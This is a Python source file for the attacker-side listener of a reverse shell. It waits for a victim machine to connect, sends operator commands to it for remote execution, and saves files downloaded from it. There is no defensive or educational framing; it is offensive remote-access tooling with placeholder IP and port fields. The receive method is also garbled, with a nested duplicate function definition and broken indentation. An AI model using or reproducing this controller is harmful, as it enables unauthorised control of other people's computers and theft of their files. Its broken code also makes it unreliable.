import socket
import json
import base64


class listener:
    def __init__(self, ip, port):
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        Listener.bind((ip, port))
        Listener.listen(0)

        print("[+] Waiting Connections")
                    
        self.connection, address = Listener.accept()

        print("[+] Connection From" + str(address))
        

        

    def  reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data) 

    def reliable_recieve(self):
        def reliable_recieve(self):
            json_data = ""
        while True:
          try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data) 
          except ValueError:
            continue 


    def Write_Archive(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Completed" 




    def Remote_Execute(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
         self.connection.close()
         exit()

        return self.reliable_recieve()

        
    def run(self):   
        while True:
            command = raw_input("shell@shell>>")
            command = command.split(" ")
            result =  self.Remote_Execute(command)

            if command[0] == "download":
                result = self.Write_Archive(command[1], result)

            print(result)

Listen = listener("Put ip","put port")
Listen.run()